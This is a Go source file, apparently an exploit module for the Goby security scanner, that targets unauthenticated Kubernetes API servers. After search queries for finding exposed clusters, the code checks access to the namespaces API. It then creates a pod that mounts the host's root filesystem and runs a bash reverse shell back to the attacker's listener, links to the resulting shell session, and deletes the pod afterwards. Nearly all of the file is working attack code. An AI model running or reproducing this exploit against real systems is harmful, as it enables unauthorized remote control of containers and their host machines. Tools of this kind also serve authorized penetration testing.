package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Kubernetes Unauthorized RCE",
    "Description": "When the service port is available, anyone can execute commands inside the container.\\n",
    "Impact": "Kubernetes Unauthorized RCE",
    "Recommendation": "<p>Restrict access to controlled machines only</p>",
    "Product": "Kubernetes",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Kubernetes 未授权远程命令执行漏洞",
            "Description": "<p>Kubernetes，简称K8s，是一个开源的，用于管理云平台中多个主机上的容器化的应用，Kubernetes的目标是让部署容器化的应用简单并且高效（powerful）,Kubernetes提供了应用部署，规划，更新，维护的一种机制。<br></p><p>Kubernetes 存在未授权远程命令执行漏洞，攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Kubernetes 存在未授权远程命令执行漏洞，</span><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可通过该漏洞在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</span></p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://kubernetes.io/\">https://kubernetes.io/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "kubernetes",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Kubernetes Unauthorized RCE",
            "Description": "When the service port is available, anyone can execute commands inside the container.\\n",
            "Impact": "Kubernetes Unauthorized RCE",
            "Recommendation": "<p>Restrict access to controlled machines only<br></p>",
            "Product": "Kubernetes",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(title=\"Kubernetes dashboard\" || body=\"href=\\\"assets/images/kubernetes-logo.png\" || body=\"<article class=\\\"post kubernetes\" || body=\"<b>KUBERNETES</b> listening\" || body=\"value=\\\"kubernetes\" || header=\"realm=\\\"kubernetes\" || banner=\"realm=\\\"kubernetes\" || title=\"Kubernetes CI\" || ((body=\"/healthz\" || body=\"/metrics\") && body=\"paths\" && header=\"application/json\") || (((header=\"401 Unauthorized\" || header=\"403 Forbidden\") && header=\"Audit-Id\") || header=\"X-Kubernetes-Pf-Flowschema-Uid\") || (((banner=\"401 Unauthorized\" || banner=\"403 Forbidden\") && banner=\"Audit-Id\") || banner=\"X-Kubernetes-Pf-Flowschema-Uid\") || title==\"Kubernetes Dashboard\" || title==\"Ingress Default Backend - 404 Not Found\" || title==\"Mirantis Kubernetes Engine\" || title=\"Kubernetes Operational View\")",
    "GobyQuery": "(title=\"Kubernetes dashboard\" || body=\"href=\\\"assets/images/kubernetes-logo.png\" || body=\"<article class=\\\"post kubernetes\" || body=\"<b>KUBERNETES</b> listening\" || body=\"value=\\\"kubernetes\" || header=\"realm=\\\"kubernetes\" || banner=\"realm=\\\"kubernetes\" || title=\"Kubernetes CI\" || ((body=\"/healthz\" || body=\"/metrics\") && body=\"paths\" && header=\"application/json\") || (((header=\"401 Unauthorized\" || header=\"403 Forbidden\") && header=\"Audit-Id\") || header=\"X-Kubernetes-Pf-Flowschema-Uid\") || (((banner=\"401 Unauthorized\" || banner=\"403 Forbidden\") && banner=\"Audit-Id\") || banner=\"X-Kubernetes-Pf-Flowschema-Uid\") || title==\"Kubernetes Dashboard\" || title==\"Ingress Default Backend - 404 Not Found\" || title==\"Mirantis Kubernetes Engine\" || title=\"Kubernetes Operational View\")",
    "Author": "李大壮",
    "Homepage": "https://kubernetes.io/",
    "DisclosureDate": "2021-06-03",
    "References": [
        "https://blog.binaryedge.io/2018/12/06/kubernetes-being-hijacked-worldwide/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [
            "kubernetes"
        ],
        "System": [],
        "Hardware": []
    },
    "PocId": "10810"
}`

	radChar := goutils.RandomHexString(4)

	strContainList := func(rawStr string, checkStrList []string) bool {
		for _, checkStr := range checkStrList {
			if !strings.Contains(rawStr, checkStr) {
				return false
			}
		}
		return true
	}
	doPost := func(FixedHostInfo string) bool {
		vulPath := "/api/v1/namespaces?limit=500"
		checkStrList := []string{
			"NamespaceList", "metadata",
			"apiVersion",
		}
		if resp, err := httpclient.SimpleGet(FixedHostInfo + vulPath); err == nil {
			return resp.StatusCode == 200 && strContainList(resp.Utf8Html, checkStrList)
		}
		return false
	}
	createPod := func(u *httpclient.FixUrl, cmd string) {
		createURL := "/api/v1/namespaces/default/pods?fieldManager=kubectl-create"
		log.Println("create pod mytest-app-" + radChar)
		cfg := httpclient.NewPostRequestConfig(createURL)
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Header.Store("Referer", u.FixedHostInfo)
		cfg.VerifyTls = false
		cfg.Data = fmt.Sprintf(`{"apiVersion":"v1","kind":"Pod","metadata":{"name":"mytest-app-%s","namespace":"default"},"spec":{"containers":[{"command":["/bin/bash","-c","%s"],"image":"nginx","name":"test-container-%s","volumeMounts":[{"mountPath":"/mnt","name":"test-volume"}]}],"restartPolicy":"Never","volumes":[{"hostPath":{"path":"/"},"name":"test-volume"}]}}`, radChar, cmd, radChar)
		httpclient.DoHttpRequest(u, cfg)
	}
	deletePod := func(u *httpclient.FixUrl) {
		deleteURL := fmt.Sprintf("/api/v1/namespaces/default/pods/mytest-app-%s", radChar)
		cfg := httpclient.NewRequestConfig("DELETE", deleteURL)
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Header.Store("Referer", u.FixedHostInfo)
		cfg.VerifyTls = false
		cfg.Data = fmt.Sprintf(`{"propagationPolicy":"Background"}`)
		httpclient.DoHttpRequest(u, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			return doPost(u.FixedHostInfo)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			expResult.Output = "please install kubectl (https://kubernetes.io/docs/tasks/tools/) and connect it"
			waitSessionCh := make(chan string)
			if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
				log.Println("[WARNING] godclient bind failed", err)
			} else {
				cmd := godclient.ReverseTCPByBash(rp)
				createPod(expResult.HostInfo, cmd)
				defer deletePod(expResult.HostInfo)
				select {
				case webConsleID := <-waitSessionCh:
					log.Println("[DEBUG] session created at:", webConsleID)
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 60):
				}
			}
			return expResult
		},
	))
}
